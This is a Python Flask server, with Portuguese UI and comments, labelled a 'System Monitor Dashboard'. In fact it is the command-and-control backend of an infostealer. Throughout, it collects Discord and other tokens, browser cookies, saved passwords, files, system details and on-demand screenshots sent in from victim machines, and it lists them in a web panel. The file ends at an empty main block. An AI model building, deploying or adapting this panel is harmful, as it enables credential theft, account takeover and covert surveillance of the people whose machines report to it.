#!/usr/bin/env python3
"""
System Monitor Dashboard - Versão Menu de Dados Completo
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
# Novos dados para captura completa
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}

@app.route('/')
def index():
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        print(f"✅ Endpoint registrado: {endpoint_id}")
        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST', 'OPTIONS'])
def receive_metrics():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', [])
        
        for metric in metrics:
            metric['endpoint_id'] = endpoint_id
            metric['received_at'] = datetime.now().isoformat()
            metrics_data.append(metric)
        
        print(f"📊 Métricas recebidas de {endpoint_id}: {len(metrics)} itens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
def receive_tokens():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        endpoint_tokens[endpoint_id] = {
            'tokens': tokens,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔑 Tokens recebidos de {endpoint_id}: {len(tokens)} tokens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST', 'OPTIONS'])
def receive_cookies():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        endpoint_cookies[endpoint_id] = {
            'cookies': cookies,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🍪 Cookies recebidos de {endpoint_id}: {len(cookies)} cookies")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST', 'OPTIONS'])
def receive_passwords():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        endpoint_passwords[endpoint_id] = {
            'passwords': passwords,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔒 Senhas recebidas de {endpoint_id}: {len(passwords)} senhas")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST', 'OPTIONS'])
def receive_files():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id not in endpoint_files:
            endpoint_files[endpoint_id] = []
        
        endpoint_files[endpoint_id].extend(files)
        
        print(f"📁 Arquivos recebidos de {endpoint_id}: {len(files)} arquivos")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
def receive_screenshot():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        image_base64 = data.get('image', '')
        
        if image_base64:
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'timestamp': datetime.now().isoformat()
            }
            print(f"📸 Screenshot recebido de {endpoint_id}!")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
def request_screenshot(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        screenshot_requests[endpoint_id] = {
            'requested': True,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"📸 Screenshot solicitado para: {endpoint_id}")
        return jsonify({
            'status': 'success', 
            'message': f'Screenshot solicitado para {endpoint_id}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
def check_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        request_data = screenshot_requests.get(endpoint_id, {})
        return jsonify({
            'request_screenshot': request_data.get('requested', False),
            'timestamp': request_data.get('timestamp')
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
def clear_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if endpoint_id in screenshot_requests:
            del screenshot_requests[endpoint_id]
            print(f"🧹 Solicitação limpa para: {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
def get_endpoints():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    return jsonify(list(endpoints.values()))

@app.route('/api/metrics', methods=['GET', 'OPTIONS'])
def get_metrics():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    return jsonify(metrics_data)

@app.route('/api/screenshot/<endpoint_id>', methods=['GET', 'OPTIONS'])
def get_screenshot(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    if endpoint_id in endpoint_screenshots:
        return jsonify({
            'image': endpoint_screenshots[endpoint_id]['image'],
            'timestamp': endpoint_screenshots[endpoint_id]['timestamp']
        })
    return jsonify({'error': 'No screenshot available'}), 404

@app.route('/api/stats', methods=['GET', 'OPTIONS'])
def get_stats():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify({
        'total_endpoints': len(endpoints),
        'online_endpoints': sum(1 for e in endpoints.values() if e.get('status') == 'online'),
        'total_metrics': len(metrics_data),
        'total_screenshots': len(endpoint_screenshots),
        'last_update': datetime.now().strftime('%H:%M:%S')
    })

@app.route('/api/endpoint_data/<endpoint_id>', methods=['GET', 'OPTIONS'])
def get_endpoint_data(endpoint_id):
    """Retorna todos os dados de um endpoint específico"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        return jsonify({
            'endpoint': endpoints.get(endpoint_id, {}),
            'tokens': endpoint_tokens.get(endpoint_id, {}),
            'cookies': endpoint_cookies.get(endpoint_id, {}),
            'passwords': endpoint_passwords.get(endpoint_id, {}),
            'files': endpoint_files.get(endpoint_id, []),
            'screenshot': endpoint_screenshots.get(endpoint_id, {}),
            'metrics': [m for m in metrics_data if m.get('endpoint_id') == endpoint_id]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            color: #e0e0e0;
            overflow-x: hidden;
        }
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 50px;
        }
        .header h1 {
            font-size: 2.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 50%, #6366f1 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -1px;
            margin-bottom: 10px;
        }
        .header p {
            color: #6b7280;
            font-size: 1rem;
            font-weight: 300;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 24px;
            margin-bottom: 40px;
        }
        .stat-card {
            background: rgba(17, 17, 27, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            border-color: rgba(124, 58, 237, 0.4);
            transform: translateY(-4px);
        }
        .stat-value {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .stat-label {
            color: #6b7280;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .tabs-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        .tab {
            background: rgba(17, 17, 27, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            color: #9ca3af;
            padding: 14px 28px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 0.95rem;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        .tab:hover {
            background: rgba(124, 58, 237, 0.1);
            color: #e0e0e0;
        }
        .tab.active {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border-color: transparent;
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 20px;
        }
        .card {
            background: rgba(17, 17, 27, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.15);
            border-radius: 16px;
            padding: 24px;
            transition: all 0.3s ease;
        }
        .card:hover {
            border-color: rgba(124, 58, 237, 0.3);
            transform: translateY(-2px);
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        .card-title { font-size: 1.1rem; font-weight: 600; color: #f3f4f6; }
        .status-badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .status-badge.online {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border: 1px solid rgba(34, 197, 94, 0.3);
        }
        .card-info {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        .info-item { display: flex; flex-direction: column; gap: 4px; }
        .info-label { font-size: 0.75rem; color: #6b7280; text-transform: uppercase; }
        .info-value { font-size: 0.9rem; color: #d1d5db; font-weight: 500; }
        .btn-dados {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            margin-top: 16px;
            width: 100%;
            transition: all 0.3s ease;
        }
        .btn-dados:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4);
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
        }
        .modal-content {
            background: linear-gradient(135deg, rgba(17, 17, 27, 0.98) 0%, rgba(30, 20, 50, 0.98) 100%);
            margin: 3% auto;
            border: 1px solid rgba(124, 58, 237, 0.3);
            border-radius: 24px;
            width: 95%;
            max-width: 1000px;
            max-height: 90vh;
            overflow: hidden;
            position: relative;
            box-shadow: 0 25px 80px rgba(124, 58, 237, 0.3);
        }
        .modal-header {
            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2) 0%, rgba(168, 85, 247, 0.1) 100%);
            padding: 24px 30px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-title {
            font-size: 1.6rem;
            font-weight: 700;
            color: #f3f4f6;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .modal-close {
            color: #9ca3af;
            font-size: 32px;
            font-weight: 300;
            cursor: pointer;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s ease;
        }
        .modal-close:hover {
            color: #ef4444;
            background: rgba(239, 68, 68, 0.1);
        }
        .modal-body {
            padding: 0;
            max-height: calc(90vh - 80px);
            overflow-y: auto;
        }
        .menu-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            padding: 30px;
        }
        .menu-item {
            background: rgba(17, 17, 27, 0.8);
            border: 2px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .menu-item:hover {
            border-color: #a855f7;
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(168, 85, 247, 0.2);
        }
        .menu-icon {
            font-size: 3rem;
            margin-bottom: 16px;
        }
        .menu-title {
            font-size: 1.2rem;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 8px;
        }
        .menu-desc {
            font-size: 0.85rem;
            color: #9ca3af;
        }
        .data-content {
            padding: 30px;
            display: none;
        }
        .data-content.active {
            display: block;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .back-btn {
            background: rgba(124, 58, 237, 0.2);
            color: #a855f7;
            border: 1px solid rgba(124, 58, 237, 0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            margin-bottom: 20px;
            transition: all 0.3s ease;
        }
        .back-btn:hover {
            background: rgba(124, 58, 237, 0.3);
        }
        .data-section {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-section h3 {
            color: #a855f7;
            font-size: 1.1rem;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .token-card, .cookie-card, .password-card {
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            word-break: break-all;
        }
        .screenshot-img {
            max-width: 100%;
            border-radius: 12px;
            border: 2px solid rgba(124, 58, 237, 0.3);
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
    </style>
</head>
<body>
    <canvas id="particles-canvas"></canvas>
    <div class="container">
        <div class="header">
            <h1>System Monitor Dashboard</h1>
            <p>Monitoramento Completo</p>
        </div>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalMetrics">0</div>
                <div class="stat-label">Métricas</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>
        <div class="tabs-container">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
        </div>
        <div id="endpoints" class="tab-content active">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
            <div class="cards-grid" id="endpointsList">
                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
            </div>
        </div>
        <div id="screenshot" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
                    <option value="">Selecione um endpoint...</option>
                </select>
                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                    <div style="color: #6b7280;">Selecione um endpoint</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Menu de Dados -->
    <div id="dataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title" id="modalTitle">📊 Menu de Dados</div>
                <span class="modal-close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <!-- Menu Principal -->
                <div id="menuPrincipal" class="menu-grid">
                    <div class="menu-item" onclick="showDataCategory('tokens')">
                        <div class="menu-icon">🔑</div>
                        <div class="menu-title">Tokens</div>
                        <div class="menu-desc">Discord e outras contas</div>
                    </div>
                    <div class="menu-item" onclick="showDataCategory('cookies')">
                        <div class="menu-icon">🍪</div>
                        <div class="menu-title">Cookies</div>
                        <div class="menu-desc">Sessões de navegador</div>
                    </div>
                    <div class="menu-item" onclick="showDataCategory('passwords')">
                        <div class="menu-icon">🔒</div>
                        <div class="menu-title">Senhas</div>
                        <div class="menu-desc">Logins salvos</div>
                    </div>
                    <div class="menu-item" onclick="showDataCategory('files')">
                        <div class="menu-icon">📁</div>
                        <div class="menu-title">Arquivos</div>
                        <div class="menu-desc">Documentos e downloads</div>
                    </div>
                    <div class="menu-item" onclick="showDataCategory('system')">
                        <div class="menu-icon">🖥️</div>
                        <div class="menu-title">Sistema</div>
                        <div class="menu-desc">Informações do PC</div>
                    </div>
                    <div class="menu-item" onclick="showDataCategory('screenshot')">
                        <div class="menu-icon">📸</div>
                        <div class="menu-title">Screenshot</div>
                        <div class="menu-desc">Tela do PC</div>
                    </div>
                </div>

                <!-- Conteúdo das Categorias -->
                <div id="tokensContent" class="data-content">
                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
                    <div class="data-section">
                        <h3>🔑 Tokens Capturados</h3>
                        <div id="tokensList"><div class="empty-state">Carregando...</div></div>
                    </div>
                </div>
                <div id="cookiesContent" class="data-content">
                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
                    <div class="data-section">
                        <h3>🍪 Cookies do Navegador</h3>
                        <div id="cookiesList"><div class="empty-state">Carregando...</div></div>
                    </div>
                </div>
                <div id="passwordsContent" class="data-content">
                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
                    <div class="data-section">
                        <h3>🔒 Senhas Salvas</h3>
                        <div id="passwordsList"><div class="empty-state">Carregando...</div></div>
                    </div>
                </div>
                <div id="filesContent" class="data-content">
                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
                    <div class="data-section">
                        <h3>📁 Arquivos</h3>
                        <div id="filesList"><div class="empty-state">Carregando...</div></div>
                    </div>
                </div>
                <div id="systemContent" class="data-content">
                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
                    <div class="data-section">
                        <h3>🖥️ Informações do Sistema</h3>
                        <div id="systemInfo"><div class="empty-state">Carregando...</div></div>
                    </div>
                </div>
                <div id="screenshotDataContent" class="data-content">
                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
                    <div class="data-section">
                        <h3>📸 Screenshot</h3>
                        <div id="screenshotData"><div class="empty-state">Nenhum screenshot</div></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Partículas
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        
        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 2 + 0.5;
                this.speedX = Math.random() * 0.5 - 0.25;
                this.speedY = Math.random() * 0.5 - 0.25;
                this.opacity = Math.random() * 0.5 + 0.1;
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.x > canvas.width) this.x = 0;
                if (this.x < 0) this.x = canvas.width;
                if (this.y > canvas.height) this.y = 0;
                if (this.y < 0) this.y = canvas.height;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(168, 85, 247, ${this.opacity})`;
                ctx.fill();
            }
        }
        
        function initParticles() {
            particles = [];
            const count = Math.min(100, Math.floor((canvas.width * canvas.height) / 15000));
            for (let i = 0; i < count; i++) particles.push(new Particle());
        }
        
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(animateParticles);
        }
        
        initParticles();
        animateParticles();
        
        // Variáveis globais
        let currentEndpointId = null;
        let currentEndpointData = null;
        
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
                document.getElementById('totalMetrics').textContent = data.total_metrics || 0;
                document.getElementById('totalScreenshots').textContent = data.total_screenshots || 0;
            } catch(e) {}
        }
        
        async function loadEndpoints() {
            try {
                const res = await fetch('/api/endpoints');
                const endpoints = await res.json();
                const container = document.getElementById('endpointsList');
                const select = document.getElementById('endpointSelect');
                
                if (endpoints.length === 0) {
                    container.innerHTML = '<div style="color: #6b7280; text-align: center; padding: 40px;">Nenhum endpoint conectado</div>';
                    return;
                }
                
                let selectHtml = '<option value="">Selecione um endpoint...</option>';
                container.innerHTML = endpoints.map(e => {
                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                    return `
                    <div class="card">
                        <div class="card-header">
                            <span class="card-title">${e.hostname}</span>
                            <span class="status-badge ${e.status}">${e.status}</span>
                        </div>
                        <div class="card-info">
                            <div class="info-item"><span class="info-label">Usuario</span><span class="info-value">${e.user}</span></div>
                            <div class="info-item"><span class="info-label">IP Local</span><span class="info-value">${e.ip_address}</span></div>
                            <div class="info-item"><span class="info-label">IP Externo</span><span class="info-value">${e.external_ip}</span></div>
                            <div class="info-item"><span class="info-label">Plataforma</span><span class="info-value">${e.platform}</span></div>
                            <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
                            <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
                        </div>
                        <button class="btn-dados" onclick="openDataModal('${e.id}', '${e.hostname}')">📊 Ver Dados</button>
                    </div>`;
                }).join('');
                
                select.innerHTML = selectHtml;
            } catch(e) {}
        }
        
        async function openDataModal(endpointId, hostname) {
            currentEndpointId = endpointId;
            document.getElementById('modalTitle').textContent = `📊 ${hostname}`;
            document.getElementById('dataModal').style.display = 'block';
            showMenu();
            
            // Carrega os dados
            try {
                const res = await fetch(`/api/endpoint_data/${endpointId}`);
                currentEndpointData = await res.json();
            } catch(e) {
                console.error('Erro ao carregar dados:', e);
            }
        }
        
        function closeModal() {
            document.getElementById('dataModal').style.display = 'none';
            currentEndpointId = null;
            currentEndpointData = null;
        }
        
        function showMenu() {
            document.getElementById('menuPrincipal').style.display = 'grid';
            document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
        }
        
        function showDataCategory(category) {
            document.getElementById('menuPrincipal').style.display = 'none';
            document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
            
            if (!currentEndpointData) return;
            
            const data = currentEndpointData;
            
            switch(category) {
                case 'tokens':
                    const tokens = data.tokens?.tokens || [];
                    const tokensHtml = tokens.length > 0 
                        ? tokens.map(t => `<div class="token-card">${t.token || t}</div>`).join('')
                        : '<div class="empty-state">Nenhum token capturado</div>';
                    document.getElementById('tokensList').innerHTML = tokensHtml;
                    document.getElementById('tokensContent').classList.add('active');
                    break;
                    
                case 'cookies':
                    const cookies = data.cookies?.cookies || [];
                    const cookiesHtml = cookies.length > 0
                        ? cookies.map(c => `<div class="cookie-card">${c.domain || ''}: ${c.name || c}</div>`).join('')
                        : '<div class="empty-state">Nenhum cookie capturado</div>';
                    document.getElementById('cookiesList').innerHTML = cookiesHtml;
                    document.getElementById('cookiesContent').classList.add('active');
                    break;
                    
                case 'passwords':
                    const passwords = data.passwords?.passwords || [];
                    const passwordsHtml = passwords.length > 0
                        ? passwords.map(p => `<div class="password-card">${p.url || ''}: ${p.username || ''} / ${p.password || p}</div>`).join('')
                        : '<div class="empty-state">Nenhuma senha capturada</div>';
                    document.getElementById('passwordsList').innerHTML = passwordsHtml;
                    document.getElementById('passwordsContent').classList.add('active');
                    break;
                    
                case 'files':
                    const files = data.files || [];
                    const filesHtml = files.length > 0
                        ? files.map(f => `<div class="password-card">${f}</div>`).join('')
                        : '<div class="empty-state">Nenhum arquivo capturado</div>';
                    document.getElementById('filesList').innerHTML = filesHtml;
                    document.getElementById('filesContent').classList.add('active');
                    break;
                    
                case 'system':
                    const endpoint = data.endpoint || {};
                    const systemHtml = Object.entries(endpoint).map(([k, v]) => 
                        `<div class="data-item"><span class="data-label">${k}</span><span class="data-value">${v}</span></div>`
                    ).join('');
                    document.getElementById('systemInfo').innerHTML = systemHtml || '<div class="empty-state">Sem informações</div>';
                    document.getElementById('systemContent').classList.add('active');
                    break;
                    
                case 'screenshot':
                    if (data.screenshot?.image) {
                        document.getElementById('screenshotData').innerHTML = 
                            `<img class="screenshot-img" src="data:image/png;base64,${data.screenshot.image}" alt="Screenshot">`;
                    } else {
                        document.getElementById('screenshotData').innerHTML = '<div class="empty-state">Nenhum screenshot</div>';
                    }
                    document.getElementById('screenshotDataContent').classList.add('active');
                    break;
            }
        }
        
        window.onclick = function(event) {
            const modal = document.getElementById('dataModal');
            if (event.target == modal) {
                closeModal();
            }
        }
        
        async function selectEndpoint() {
            const endpointId = document.getElementById('endpointSelect').value;
            document.getElementById('screenshotBtn').disabled = !endpointId;
        }
        
        async function requestScreenshot() {
            const endpointId = document.getElementById('endpointSelect').value;
            if (!endpointId) return;
            
            const btn = document.getElementById('screenshotBtn');
            btn.disabled = true;
            btn.textContent = '📸 Capturando...';
            
            try {
                await fetch(`/api/request_screenshot/${endpointId}`, { method: 'POST' });
                document.getElementById('screenContent').innerHTML = '<div style="color: #22c55e;">✅ Screenshot solicitado! Aguarde...</div>';
                
                let attempts = 0;
                const interval = setInterval(async () => {
                    attempts++;
                    const res = await fetch(`/api/screenshot/${endpointId}`);
                    if (res.ok) {
                        const data = await res.json();
                        if (data.image) {
                            clearInterval(interval);
                            document.getElementById('screenContent').innerHTML = `
                                <div style="display: inline-flex; align-items: center; gap: 8px; background: rgba(239, 68, 68, 0.15); color: #ef4444; padding: 8px 16px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; margin-bottom: 20px;"><span style="width: 8px; height: 8px; background: #ef4444; border-radius: 50%;"></span><span>LIVE</span></div>
                                <img style="max-width: 100%; max-height: 70vh; border-radius: 12px; border: 1px solid rgba(124, 58, 237, 0.3);" src="data:image/png;base64,${data.image}">
                            `;
                            btn.disabled = false;
                            btn.textContent = '📸 Capturar Screenshot';
                        }
                    }
                    if (attempts >= 15) {
                        clearInterval(interval);
                        btn.disabled = false;
                        btn.textContent = '📸 Capturar Screenshot';
                    }
                }, 1000);
            } catch (error) {
                document.getElementById('screenContent').innerHTML = `<div style="color: #ef4444;">❌ Erro: ${error.message}</div>`;
                btn.disabled = false;
                btn.textContent = '📸 Capturar Screenshot';
            }
        }
        
        loadStats();
        loadEndpoints();
        setInterval(() => {
            loadStats();
            loadEndpoints();
        }, 5000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
